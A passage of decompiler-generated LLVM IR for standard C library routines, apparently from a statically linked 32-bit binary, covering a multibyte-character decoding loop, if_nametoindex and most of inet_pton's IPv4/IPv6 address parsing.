  %v3_8051791 = zext i8 %v2_8051791 to i32
  %v4_8051791 = load i32, i32* @ecx, align 4
  %v5_8051791 = and i32 %v4_8051791, -256
  %v6_8051791 = or i32 %v5_8051791, %v3_8051791
  store i32 %v6_8051791, i32* @ecx, align 4
  %v2_8051795 = sdiv i32 %v0_80517b3, 67108864
  %v3_805179a = udiv i8 %v2_8051791, 8
  %v8_805179a = zext i8 %v3_805179a to i32
  %v2_80517a0 = add nsw i32 %v8_805179a, %v2_8051795
  %v1_80517a3 = add nsw i32 %v8_805179a, -16
  store i32 %v1_80517a3, i32* %edx.global-to-local, align 4
  %v2_80517a6 = or i32 %v2_80517a0, %v1_80517a3
  %v2_80517a8 = icmp ult i32 %v2_80517a6, 8
  br i1 %v2_80517a8, label %dec_label_pc_80517b0, label %dec_label_pc_80517ad

dec_label_pc_80517ad:                             ; preds = %dec_label_pc_8051791, %dec_label_pc_80516b8
  %v0_805180040 = phi i32 [ %v0_80516ef, %dec_label_pc_80516b8 ], [ %v0_80517b3, %dec_label_pc_8051791 ]
  %v0_80517ad = phi i32 [ %v0_80516d6, %dec_label_pc_80516b8 ], [ %v0_80517b8, %dec_label_pc_8051791 ]
  %v1_80517ad = add i32 %v0_80517ad, -1
  store i32 %v1_80517ad, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051800

dec_label_pc_80517b0:                             ; preds = %dec_label_pc_8051791
  %v1_80517b5 = add nsw i32 %v3_8051791, -128
  %v1_80517b8 = add i32 %v0_80517b8, 1
  store i32 %v1_80517b8, i32* %ebx.global-to-local, align 4
  %v2_80517b9 = mul i32 %v0_80517b3, 64
  store i32 %v2_80517b9, i32* %edx.global-to-local, align 4
  %v2_80517be = or i32 %v1_80517b5, %v2_80517b9
  %v4_80517be = icmp slt i32 %v2_80517be, 0
  %v1_80517c0 = icmp eq i1 %v4_80517be, false
  br i1 %v1_80517c0, label %dec_label_pc_80517f4, label %dec_label_pc_80517c2

dec_label_pc_80517c2:                             ; preds = %dec_label_pc_80517b0
  %v1_80517c2 = inttoptr i32 %v1_80517b8 to i8*
  %v2_80517c2 = load i8, i8* %v1_80517c2, align 1
  %v3_80517c2 = zext i8 %v2_80517c2 to i32
  %v1_80517c5 = add nsw i32 %v3_80517c2, -128
  store i32 %v1_80517c5, i32* @ecx, align 4
  %v5_80517c8 = icmp ult i32 %v1_80517c5, 63
  %v9_80517c8 = icmp eq i8 %v2_80517c2, -65
  %v2_80517cb = or i1 %v9_80517c8, %v5_80517c8
  br i1 %v2_80517cb, label %dec_label_pc_80517d2, label %dec_label_pc_80517cd

dec_label_pc_80517cd:                             ; preds = %dec_label_pc_80516df, %dec_label_pc_80517c2
  %v0_805180039 = phi i32 [ %v0_80516ef, %dec_label_pc_80516df ], [ %v2_80517be, %dec_label_pc_80517c2 ]
  %v0_80517cd = phi i32 [ %v1_80516d6, %dec_label_pc_80516df ], [ %v1_80517b8, %dec_label_pc_80517c2 ]
  %v1_80517cd = add i32 %v0_80517cd, -2
  store i32 %v1_80517cd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051800

dec_label_pc_80517d2:                             ; preds = %dec_label_pc_80517c2
  %v1_80517d4 = add i32 %v0_80517b8, 2
  store i32 %v1_80517d4, i32* %ebx.global-to-local, align 4
  %v2_80517d5 = mul i32 %v2_80517be, 64
  %v2_80517da = or i32 %v1_80517c5, %v2_80517d5
  %v4_80517da = icmp slt i32 %v2_80517da, 0
  %v1_80517dc = icmp eq i1 %v4_80517da, false
  br i1 %v1_80517dc, label %dec_label_pc_80517f4, label %dec_label_pc_80517de

dec_label_pc_80517de:                             ; preds = %dec_label_pc_80517d2
  %v1_80517de = inttoptr i32 %v1_80517d4 to i8*
  %v2_80517de = load i8, i8* %v1_80517de, align 1
  %v3_80517de = zext i8 %v2_80517de to i32
  %v1_80517e1 = add nsw i32 %v3_80517de, -128
  %v5_80517e4 = icmp ult i32 %v1_80517e1, 63
  %v9_80517e4 = icmp eq i8 %v2_80517de, -65
  %v2_80517e7 = or i1 %v9_80517e4, %v5_80517e4
  br i1 %v2_80517e7, label %dec_label_pc_80517ee, label %dec_label_pc_80517e9

dec_label_pc_80517e9:                             ; preds = %dec_label_pc_80516f7, %dec_label_pc_80517de
  %v0_805180038 = phi i32 [ %v0_80516ef, %dec_label_pc_80516f7 ], [ %v2_80517da, %dec_label_pc_80517de ]
  %v0_80517e9 = phi i32 [ %v1_80516ee, %dec_label_pc_80516f7 ], [ %v1_80517d4, %dec_label_pc_80517de ]
  %v1_80517e9 = add i32 %v0_80517e9, -3
  store i32 %v1_80517e9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051800

dec_label_pc_80517ee:                             ; preds = %dec_label_pc_80517de
  %v2_80517ee = mul i32 %v2_80517da, 64
  %v1_80517f1 = add i32 %v0_80517b8, 3
  store i32 %v1_80517f1, i32* %ebx.global-to-local, align 4
  %v2_80517f2 = or i32 %v1_80517e1, %v2_80517ee
  br label %dec_label_pc_80517f4

dec_label_pc_80517f4:                             ; preds = %dec_label_pc_80517d2, %dec_label_pc_80517b0, %dec_label_pc_80517ee
  %v0_80517f4 = phi i32 [ %v2_80517da, %dec_label_pc_80517d2 ], [ %v2_80517be, %dec_label_pc_80517b0 ], [ %v2_80517f2, %dec_label_pc_80517ee ]
  %v1_80517f4 = load i32, i32* @ebp, align 4
  %v2_80517f4 = inttoptr i32 %v1_80517f4 to i32*
  store i32 %v0_80517f4, i32* %v2_80517f4, align 4
  %v0_8051779.sink111 = load i32, i32* @ebp, align 4
  %v1_8051779112 = add i32 %v0_8051779.sink111, 4
  store i32 %v1_8051779112, i32* @ebp, align 4
  %v0_80517fa113 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517fa114 = add i32 %v0_80517fa113, -1
  %v8_80517fa115 = icmp eq i32 %v1_80517fa114, 0
  store i32 %v1_80517fa114, i32* %edi.global-to-local, align 4
  %v1_805170f117 = icmp eq i1 %v8_80517fa115, false
  %v0_8051720118 = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v1_805170f117, label %dec_label_pc_8051720, label %dec_label_pc_8051711

dec_label_pc_8051800:                             ; preds = %dec_label_pc_80517e9, %dec_label_pc_80517cd, %dec_label_pc_80517ad
  %v0_805180442 = phi i32 [ %v1_80517e9, %dec_label_pc_80517e9 ], [ %v1_80517cd, %dec_label_pc_80517cd ], [ %v1_80517ad, %dec_label_pc_80517ad ]
  %v0_8051800 = phi i32 [ %v0_805180038, %dec_label_pc_80517e9 ], [ %v0_805180039, %dec_label_pc_80517cd ], [ %v0_805180040, %dec_label_pc_80517ad ]
  %v1_8051800 = icmp eq i32 %v0_8051800, 0
  %v1_8051802 = icmp eq i1 %v1_8051800, false
  br i1 %v1_8051802, label %dec_label_pc_8051826, label %dec_label_pc_8051804

dec_label_pc_8051804:                             ; preds = %dec_label_pc_805177e, %dec_label_pc_80516a1, %dec_label_pc_8051800
  %v0_8051804 = phi i32 [ %v0_805180442, %dec_label_pc_8051800 ], [ %v0_80516b7, %dec_label_pc_80516a1 ], [ %v0_8051790, %dec_label_pc_805177e ]
  %v1_8051804 = inttoptr i32 %v0_8051804 to i8*
  %v2_8051804 = load i8, i8* %v1_8051804, align 1
  %v3_8051804 = icmp eq i8 %v2_8051804, 0
  %v1_8051807 = icmp eq i1 %v3_8051804, false
  br i1 %v1_8051807, label %dec_label_pc_8051826, label %dec_label_pc_8051809

dec_label_pc_8051809:                             ; preds = %dec_label_pc_8051804
  %v0_8051809 = load i32, i32* @ebp, align 4
  %v1_8051809 = icmp eq i32 %v0_8051809, 0
  br i1 %v1_8051809, label %dec_label_pc_805181e, label %dec_label_pc_805180d

dec_label_pc_805180d:                             ; preds = %dec_label_pc_8051809
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v1_8051811 = inttoptr i32 %v0_8051809 to i32*
  store i32 0, i32* %v1_8051811, align 4
  %v0_8051818 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051818 = inttoptr i32 %v0_8051818 to i32*
  store i32 0, i32* %v1_8051818, align 4
  br label %dec_label_pc_805181e

dec_label_pc_805181e:                             ; preds = %dec_label_pc_8051809, %dec_label_pc_805180d
  %v1_8051822 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051822 = sub i32 %arg3, %v1_8051822
  br label %dec_label_pc_8051841

dec_label_pc_8051826:                             ; preds = %dec_label_pc_8051804, %dec_label_pc_8051800
  %v2_8051826 = call i32 @__errno_location(i32 %v4_80515c3)
  %v1_805182b = inttoptr i32 %v2_8051826 to i32*
  store i32 84, i32* %v1_805182b, align 4
  %v0_8051834 = load i32, i32* @ebp, align 4
  %v1_8051834 = icmp eq i32 %v0_8051834, 0
  br i1 %v1_8051834, label %dec_label_pc_8051841, label %dec_label_pc_8051838

dec_label_pc_8051838:                             ; preds = %dec_label_pc_8051826
  %v0_805183c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805183c, i32* %v1_80515d9, align 4
  br label %dec_label_pc_8051841

dec_label_pc_8051841:                             ; preds = %dec_label_pc_8051826, %dec_label_pc_805181e, %dec_label_pc_8051711, %dec_label_pc_8051838
  %v0_8051848 = phi i32 [ -1, %dec_label_pc_8051826 ], [ %v2_8051822, %dec_label_pc_805181e ], [ %arg3, %dec_label_pc_8051711 ], [ -1, %dec_label_pc_8051838 ]
  store i32 %v0_80515b7, i32* @ebx, align 4
  store i32 %v0_80515b6, i32* @esi, align 4
  store i32 %v0_80515b5, i32* @edi, align 4
  store i32 %v0_80515b4, i32* @ebp, align 4
  ret i32 %v0_8051848

; uselistorder directives
  uselistorder i32 %v0_8051720118, { 1, 0 }
  uselistorder i32 %v1_80517fa114, { 1, 2, 0 }
  uselistorder i32 %v1_8051779112, { 1, 0 }
  uselistorder i32 %v2_80517da, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80517be, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80517b9, { 1, 0 }
  uselistorder i32 %v8_805179a, { 1, 0 }
  uselistorder i32 %v3_8051791, { 1, 0 }
  uselistorder i32 %v0_80517b8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80517b3, { 0, 2, 1 }
  uselistorder i32 %v1_80517fa, { 2, 1, 0 }
  uselistorder i32 %v1_8051779, { 1, 0 }
  uselistorder i32 %v1_8051778, { 2, 1, 0 }
  uselistorder i32 %v0_805176a.pre.pre106, { 0, 2, 1 }
  uselistorder i32 %v0_8051754.pre, { 1, 0 }
  uselistorder i32 %v1_80517fa120, { 1, 0 }
  uselistorder i32 %v0_805176a.pre.pre101, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v1_8051707, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_8051678, { 6, 0, 3, 2, 1, 5, 4 }
  uselistorder i32 %v1_80516ee, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v8_80516bf, { 1, 0 }
  uselistorder i32 %v0_80516ef, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_805170729, { 1, 0 }
  uselistorder i32 %v1_8051682, { 0, 2, 1 }
  uselistorder i32 %v1_805167f, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10 }
  uselistorder i32* %edi.global-to-local, { 7, 0, 8, 1, 3, 2, 4, 5, 6, 9 }
  uselistorder i32* %ebx.global-to-local, { 19, 4, 0, 1, 2, 3, 5, 6, 7, 8, 9, 13, 14, 10, 11, 12, 15, 16, 17, 18, 20 }
  uselistorder i32 -3, { 4, 5, 6, 0, 1, 3, 2 }
  uselistorder i8 -65, { 1, 2, 0 }
  uselistorder i32 524288, { 3, 5, 1, 0, 2, 4 }
  uselistorder i8 -64, { 0, 1, 2, 4, 3 }
  uselistorder i32 50, { 3, 2, 1, 0 }
  uselistorder i32 -2139062144, { 7, 8, 0, 6, 1, 11, 2, 4, 9, 3, 10, 5 }
  uselistorder i32 -16843009, { 5, 6, 0, 4, 1, 11, 2, 8, 7, 3, 9, 10 }
  uselistorder i32 %arg3, { 1, 3, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051841, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805181e, { 1, 0 }
  uselistorder label %dec_label_pc_8051804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80517f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80517e9, { 1, 0 }
  uselistorder label %dec_label_pc_80517cd, { 1, 0 }
  uselistorder label %dec_label_pc_8051791, { 1, 0 }
  uselistorder label %dec_label_pc_805176a, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051759, { 1, 0 }
  uselistorder label %dec_label_pc_8051711, { 1, 0 }
  uselistorder label %dec_label_pc_8051707, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80516b8, { 1, 0 }
  uselistorder label %dec_label_pc_8051696, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805167f, { 1, 0 }
}

define i32 @if_nametoindex(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  store i32 1, i32* %stack_var_-60, align 4
  %v3_805185a = call i32 @socket(i32 1, i32 524290, i32 0)
  %v2_8051865 = icmp slt i32 %v3_805185a, 0
  store i32 %v3_805185a, i32* @esi, align 4
  br i1 %v2_8051865, label %dec_label_pc_80518a8, label %dec_label_pc_805186b

dec_label_pc_805186b:                             ; preds = %entry
  %v2_8051872 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8051872, i32* @ebx, align 4
  store i32 %v2_8051872, i32* %stack_var_-60, align 4
  %v3_8051877 = call i32 @strncpy(i32 %v2_8051872, i32 %arg1, i32 16)
  store i32 6, i32* @ebx, align 4
  %v0_805188a = load i32, i32* @esi, align 4
  store i32 %v0_805188a, i32* %stack_var_-60, align 4
  %v3_805188b = call i32 @ioctl(i32 %v0_805188a, i32 35123, i32 %v2_8051872)
  %v0_8051890 = load i32, i32* @esi, align 4
  store i32 %v0_8051890, i32* @edx, align 4
  store i32 %v3_805188b, i32* @ecx, align 4
  %v0_8051894 = load i32, i32* @ebx, align 4
  store i32 %v0_8051894, i32* @eax, align 4
  %v0_8051896 = load i32, i32* %stack_var_-60, align 4
  %v1_8051896 = call i32 @__vsyscall(i32 %v0_8051896)
  %v2_80518a0 = icmp slt i32 %v3_805188b, 0
  br i1 %v2_80518a0, label %dec_label_pc_80518a8, label %dec_label_pc_80518a4

dec_label_pc_80518a4:                             ; preds = %dec_label_pc_805186b
  br label %dec_label_pc_80518a8

dec_label_pc_80518a8:                             ; preds = %dec_label_pc_805186b, %entry, %dec_label_pc_80518a4
  %v0_80518ab = phi i32 [ 0, %dec_label_pc_805186b ], [ -1, %entry ], [ %tmp, %dec_label_pc_80518a4 ]
  ret i32 %v0_80518ab

; uselistorder directives
  uselistorder i32 %v2_8051872, { 0, 2, 1, 3 }
  uselistorder i32 %v3_805185a, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80518a8, { 2, 0, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_80518b0 = load i32, i32* @ebp, align 4
  %v0_80518b1 = load i32, i32* @edi, align 4
  %v0_80518b2 = load i32, i32* @esi, align 4
  %v0_80518b3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80518bb = ptrtoint i8* %arg2 to i32
  store i32 %v4_80518bb, i32* @esi, align 4
  %v9_80518bf = icmp eq i32 %arg1, 2
  %v1_80518c2 = icmp eq i1 %v9_80518bf, false
  br i1 %v1_80518c2, label %dec_label_pc_805193a, label %dec_label_pc_8051add

dec_label_pc_80518c9:                             ; preds = %dec_label_pc_80518d5
  %v3_80518c9 = mul i32 %v1_80518c9, 10
  store i32 %v3_80518c9, i32* %eax.global-to-local, align 4
  %v1_80518cc = add nuw nsw i32 %v0_80518cc, 1
  store i32 %v1_80518cc, i32* %edx.global-to-local, align 4
  %v9_80518cd = icmp eq i32 %v0_80518cc, 2
  %v2_80518d0 = add i32 %v1_80518d9, %v3_80518c9
  store i32 %v2_80518d0, i32* %ebx.global-to-local, align 4
  br i1 %v9_80518cd, label %dec_label_pc_80518ee, label %dec_label_pc_80518d5

dec_label_pc_80518d5:                             ; preds = %dec_label_pc_80518c9, %dec_label_pc_8051adf
  %v1_80518c9 = phi i32 [ %v2_80518d0, %dec_label_pc_80518c9 ], [ 0, %dec_label_pc_8051adf ]
  %v0_80518cc = phi i32 [ %v1_80518cc, %dec_label_pc_80518c9 ], [ 0, %dec_label_pc_8051adf ]
  %v2_80518d5 = add i32 %v0_80518cc, %v0_80518ee
  %v3_80518d5 = inttoptr i32 %v2_80518d5 to i8*
  %v4_80518d5 = load i8, i8* %v3_80518d5, align 1
  %v5_80518d5 = sext i8 %v4_80518d5 to i32
  store i32 %v5_80518d5, i32* %eax.global-to-local, align 4
  %v1_80518d9 = add nsw i32 %v5_80518d5, -48
  store i32 %v1_80518d9, i32* @ecx, align 4
  %v5_80518dc = icmp ult i32 %v1_80518d9, 9
  %v9_80518dc = icmp eq i8 %v4_80518d5, 57
  %v2_80518df = or i1 %v9_80518dc, %v5_80518dc
  br i1 %v2_80518df, label %dec_label_pc_80518c9, label %dec_label_pc_80518e1

dec_label_pc_80518e1:                             ; preds = %dec_label_pc_80518d5
  %v1_80518e1 = icmp eq i32 %v0_80518cc, 0
  br i1 %v1_80518e1, label %dec_label_pc_8051ad2, label %dec_label_pc_80518e9

dec_label_pc_80518e9:                             ; preds = %dec_label_pc_80518e1
  %v7_80518ec = icmp sgt i32 %v0_80518cc, 1
  br i1 %v7_80518ec, label %dec_label_pc_80518ee, label %dec_label_pc_80518f7

dec_label_pc_80518ee:                             ; preds = %dec_label_pc_80518c9, %dec_label_pc_80518e9
  %v0_80518f713 = phi i32 [ %v1_80518c9, %dec_label_pc_80518e9 ], [ %v2_80518d0, %dec_label_pc_80518c9 ]
  %v1_80518ee = inttoptr i32 %v0_80518ee to i8*
  %v2_80518ee = load i8, i8* %v1_80518ee, align 1
  %v8_80518ee = icmp eq i8 %v2_80518ee, 48
  br i1 %v8_80518ee, label %dec_label_pc_8051ad2, label %dec_label_pc_80518f7

dec_label_pc_80518f7:                             ; preds = %dec_label_pc_80518e9, %dec_label_pc_80518ee
  %v0_8051907 = phi i32 [ %v1_80518c9, %dec_label_pc_80518e9 ], [ %v0_80518f713, %dec_label_pc_80518ee ]
  %v1_80518f7 = add i32 %v0_8051907, -255
  %v6_80518f7 = sub i32 254, %v0_8051907
  %v7_80518f7 = and i32 %v6_80518f7, %v0_8051907
  %v8_80518f7 = icmp slt i32 %v7_80518f7, 0
  %v9_80518f7 = icmp eq i32 %v1_80518f7, 0
  %v10_80518f7 = icmp slt i32 %v1_80518f7, 0
  %v3_80518fd = icmp eq i1 %v10_80518f7, %v8_80518f7
  %v4_80518fd = icmp eq i1 %v9_80518f7, false
  %v5_80518fd = and i1 %v4_80518fd, %v3_80518fd
  br i1 %v5_80518fd, label %dec_label_pc_8051ad2, label %dec_label_pc_8051903

dec_label_pc_8051903:                             ; preds = %dec_label_pc_80518f7
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8051907 = trunc i32 %v0_8051907 to i8
  %v4_8051907 = add i32 %v2_8051907, %arg3
  %v5_8051907 = inttoptr i32 %v4_8051907 to i8*
  store i8 %v1_8051907, i8* %v5_8051907, align 1
  %v0_805190a = load i32, i32* @esi, align 4
  %v1_805190a = load i32, i32* %edx.global-to-local, align 4
  %v2_805190a = add i32 %v1_805190a, %v0_805190a
  %v3_805190a = inttoptr i32 %v2_805190a to i8*
  %v4_805190a = load i8, i8* %v3_805190a, align 1
  %v5_805190a = zext i8 %v4_805190a to i32
  %v6_805190a = load i32, i32* %eax.global-to-local, align 4
  %v7_805190a = and i32 %v6_805190a, -256
  %v8_805190a = or i32 %v7_805190a, %v5_805190a
  store i32 %v8_805190a, i32* %eax.global-to-local, align 4
  %v4_805190d = icmp eq i8 %v4_805190a, 0
  %v1_805190f = icmp eq i1 %v4_805190d, false
  br i1 %v1_805190f, label %dec_label_pc_805191f, label %dec_label_pc_8051911

dec_label_pc_8051911:                             ; preds = %dec_label_pc_8051903
  %v0_8051911 = load i32, i32* %edi.global-to-local, align 4
  %v9_8051911 = icmp eq i32 %v0_8051911, 3
  br i1 %v9_8051911, label %dec_label_pc_8051ad6, label %dec_label_pc_8051ad2

dec_label_pc_805191f:                             ; preds = %dec_label_pc_8051903
  %v10_805191f = icmp eq i8 %v4_805190a, 46
  %v1_8051921 = icmp eq i1 %v10_805191f, false
  br i1 %v1_8051921, label %dec_label_pc_8051ad2, label %dec_label_pc_8051927

dec_label_pc_8051927:                             ; preds = %dec_label_pc_805191f
  %v0_8051927 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051927 = add i32 %v0_8051927, 1
  store i32 %v1_8051927, i32* %edi.global-to-local, align 4
  %v9_8051928 = icmp eq i32 %v0_8051927, 3
  br i1 %v9_8051928, label %dec_label_pc_8051ad2, label %dec_label_pc_8051931

dec_label_pc_8051931:                             ; preds = %dec_label_pc_8051927
  %v2_8051931 = add i32 %v0_805190a, 1
  %v3_8051931 = add i32 %v2_8051931, %v1_805190a
  store i32 %v3_8051931, i32* @esi, align 4
  br label %dec_label_pc_8051adf

dec_label_pc_805193a:                             ; preds = %entry
  %v9_805193a = icmp eq i32 %arg1, 10
  br i1 %v9_805193a, label %dec_label_pc_8051952, label %dec_label_pc_805193f

dec_label_pc_805193f:                             ; preds = %dec_label_pc_805193a
  %v1_805193f = call i32 @__errno_location(i32 %v0_80518b3)
  %v1_8051944 = inttoptr i32 %v1_805193f to i32*
  store i32 97, i32* %v1_8051944, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae8

dec_label_pc_8051952:                             ; preds = %dec_label_pc_805193a
  %v2_8051952 = load i8, i8* %arg2, align 1
  %v11_8051952 = icmp eq i8 %v2_8051952, 58
  %v1_8051955 = icmp eq i1 %v11_8051952, false
  br i1 %v1_8051955, label %dec_label_pc_8051961, label %dec_label_pc_8051957

dec_label_pc_8051957:                             ; preds = %dec_label_pc_8051952
  %v1_8051957 = add i32 %v4_80518bb, 1
  store i32 %v1_8051957, i32* @esi, align 4
  %v1_8051958 = inttoptr i32 %v1_8051957 to i8*
  %v2_8051958 = load i8, i8* %v1_8051958, align 1
  %v11_8051958 = icmp eq i8 %v2_8051958, 58
  %v1_805195b = icmp eq i1 %v11_8051958, false
  br i1 %v1_805195b, label %dec_label_pc_8051ad2, label %dec_label_pc_8051961

dec_label_pc_8051961:                             ; preds = %dec_label_pc_8051957, %dec_label_pc_8051952
  %v0_805196e18 = phi i32 [ %v1_8051957, %dec_label_pc_8051957 ], [ %v4_80518bb, %dec_label_pc_8051952 ]
  store i32 0, i32* @edi, align 4
  store i32 -1, i32* @ebp, align 4
  br label %dec_label_pc_8051966

dec_label_pc_8051966:                             ; preds = %dec_label_pc_8051a3b, %dec_label_pc_8051961
  %v0_80519e8 = phi i32 [ %v1_8051a3b, %dec_label_pc_8051a3b ], [ 0, %dec_label_pc_8051961 ]
  %v0_8051985 = phi i32 [ %v0_805196e19, %dec_label_pc_8051a3b ], [ %v0_805196e18, %dec_label_pc_8051961 ]
  %v0_8051966 = phi i32 [ %v0_8051966.pre, %dec_label_pc_8051a3b ], [ -1, %dec_label_pc_8051961 ]
  %tmp = icmp slt i32 %v0_8051966, 0
  %v2_8051968 = zext i1 %tmp to i32
  store i32 %v2_8051968, i32* %edx.global-to-local, align 4
  store i32 %v2_8051968, i32* %stack_var_-76, align 4
  %v1_805196e = inttoptr i32 %v0_8051985 to i8*
  %v2_805196e = load i8, i8* %v1_805196e, align 1
  %v11_805196e = icmp eq i8 %v2_805196e, 58
  %v1_8051971 = icmp eq i1 %v11_805196e, false
  br i1 %v1_8051971, label %dec_label_pc_8051977, label %dec_label_pc_8051973

dec_label_pc_8051973:                             ; preds = %dec_label_pc_8051966
  %v3_8051968 = icmp eq i1 %tmp, false
  %v1_8051975 = icmp eq i1 %v3_8051968, false
  br i1 %v1_8051975, label %dec_label_pc_8051983, label %dec_label_pc_8051977

dec_label_pc_8051977:                             ; preds = %dec_label_pc_8051973, %dec_label_pc_8051966
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80519bc

dec_label_pc_8051983:                             ; preds = %dec_label_pc_8051973
  %v1_8051985 = add i32 %v0_8051985, 1
  store i32 %v1_8051985, i32* @esi, align 4
  %v1_8051986 = urem i32 %v0_80519e8, 8
  store i32 %v1_8051986, i32* %eax.global-to-local, align 4
  %v0_8051989 = load i32, i32* @esp, align 4
  %v2_8051989 = mul nuw nsw i32 %v1_8051986, 2
  %v3_8051989 = or i32 %v2_8051989, 32
  %v4_8051989 = add i32 %v0_8051989, %v3_8051989
  %v5_8051989 = inttoptr i32 %v4_8051989 to i16*
  store i16 0, i16* %v5_8051989, align 2
  %v0_8051990 = load i32, i32* @esi, align 4
  %v1_8051990 = inttoptr i32 %v0_8051990 to i8*
  %v2_8051990 = load i8, i8* %v1_8051990, align 1
  %v3_8051990 = icmp eq i8 %v2_8051990, 0
  %v0_8051a41 = load i32, i32* @edi, align 4
  br i1 %v3_8051990, label %dec_label_pc_8051a41, label %dec_label_pc_8051999

dec_label_pc_8051999:                             ; preds = %dec_label_pc_8051983
  %v9_8051999 = icmp eq i32 %v0_8051a41, 7
  br i1 %v9_8051999, label %dec_label_pc_8051ad2, label %dec_label_pc_80519a2

dec_label_pc_80519a2:                             ; preds = %dec_label_pc_8051999
  store i32 %v0_8051a41, i32* @ebp, align 4
  br label %dec_label_pc_8051a3b

dec_label_pc_80519a9:                             ; preds = %dec_label_pc_80519d7, %dec_label_pc_80519bc
  %v0_80519b1 = phi i32 [ %v1_80519d7, %dec_label_pc_80519d7 ], [ %v1_80519c0, %dec_label_pc_80519bc ]
  %v4_80519a9 = sext i16 %stack_var_-52.0 to i32
  %v1_80519ad = add nuw nsw i32 %v0_80519ad, 1
  store i32 %v1_80519ad, i32* %ebx.global-to-local, align 4
  %v2_80519ae = mul nsw i32 %v4_80519a9, 16
  store i32 %v2_80519ae, i32* %eax.global-to-local, align 4
  %v2_80519b1 = add nsw i32 %v0_80519b1, %v2_80519ae
  store i32 %v2_80519b1, i32* %edx.global-to-local, align 4
  %v9_80519b3 = icmp eq i32 %v0_80519ad, 3
  %v5_80519b6 = trunc i32 %v2_80519b1 to i16
  br i1 %v9_80519b3, label %dec_label_pc_80519e4, label %dec_label_pc_80519bc

dec_label_pc_80519bc:                             ; preds = %dec_label_pc_80519a9, %dec_label_pc_8051977
  %v0_80519ad = phi i32 [ 0, %dec_label_pc_8051977 ], [ %v1_80519ad, %dec_label_pc_80519a9 ]
  %stack_var_-52.0 = phi i16 [ 0, %dec_label_pc_8051977 ], [ %v5_80519b6, %dec_label_pc_80519a9 ]
  %v2_80519bc = add i32 %v0_80519ad, %v0_8051985
  %v3_80519bc = inttoptr i32 %v2_80519bc to i8*
  %v4_80519bc = load i8, i8* %v3_80519bc, align 1
  %v5_80519bc = sext i8 %v4_80519bc to i32
  store i32 %v5_80519bc, i32* @ecx, align 4
  %v1_80519c0 = add nsw i32 %v5_80519bc, -48
  store i32 %v1_80519c0, i32* %eax.global-to-local, align 4
  %v5_80519c3 = icmp ult i32 %v1_80519c0, 9
  %v9_80519c3 = icmp eq i8 %v4_80519bc, 57
  store i32 %v1_80519c0, i32* %edx.global-to-local, align 4
  %v2_80519c8 = or i1 %v9_80519c3, %v5_80519c3
  br i1 %v2_80519c8, label %dec_label_pc_80519a9, label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519bc
  %v1_80519cc = or i32 %v5_80519bc, 32
  store i32 %v1_80519cc, i32* %edx.global-to-local, align 4
  %v1_80519cf = add nsw i32 %v1_80519cc, -97
  store i32 %v1_80519cf, i32* %eax.global-to-local, align 4
  %v6_80519d5 = icmp ugt i32 %v1_80519cf, 5
  br i1 %v6_80519d5, label %dec_label_pc_80519dc, label %dec_label_pc_80519d7

dec_label_pc_80519d7:                             ; preds = %dec_label_pc_80519ca
  %v1_80519d7 = add nsw i32 %v1_80519cc, -87
  %v10_80519d7 = icmp slt i32 %v1_80519cc, 87
  store i32 %v1_80519d7, i32* %edx.global-to-local, align 4
  %v1_80519da = icmp eq i1 %v10_80519d7, false
  br i1 %v1_80519da, label %dec_label_pc_80519a9, label %dec_label_pc_80519dc

dec_label_pc_80519dc:                             ; preds = %dec_label_pc_80519d7, %dec_label_pc_80519ca
  %v1_80519dc = icmp eq i32 %v0_80519ad, 0
  br i1 %v1_80519dc, label %dec_label_pc_8051ad2, label %dec_label_pc_80519e4

dec_label_pc_80519e4:                             ; preds = %dec_label_pc_80519a9, %dec_label_pc_80519dc
  %stack_var_-52.1 = phi i16 [ %stack_var_-52.0, %dec_label_pc_80519dc ], [ %v5_80519b6, %dec_label_pc_80519a9 ]
